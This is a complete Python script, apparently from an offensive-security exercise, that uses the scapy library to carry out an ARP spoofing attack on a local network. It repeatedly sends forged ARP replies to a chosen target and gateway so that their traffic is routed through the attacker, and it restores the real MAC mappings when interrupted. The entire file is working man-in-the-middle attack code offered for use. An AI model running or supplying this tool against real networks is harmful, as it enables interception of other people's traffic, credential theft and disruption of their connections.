import scapy.all as scapy
import time
import argparse

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
	parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
	options = parser.parse_args()
	if not options.target_ip:
		parser.error("[-] Please specify a target IP address, use --help for more info.")
	if not options.gateway_ip:
		parser.error("[-] Please specify a gateway IP address, use --help for more info.")
	return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    if answered_list:  # Add a check to see if the list is not empty
        return answered_list[0][1].hwsrc
    else:
        print(f"\nNo response after 5 seconds for IP: {ip}\n")
        return None

def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
	scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)

options = get_arguments()

target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
	sent_packets_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
		time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
	print("\nCtrl + C pressed.............Exiting")
	restore(gateway_ip, target_ip)
	restore(target_ip, gateway_ip)
	print("[+] Arp Spoof Stopped")
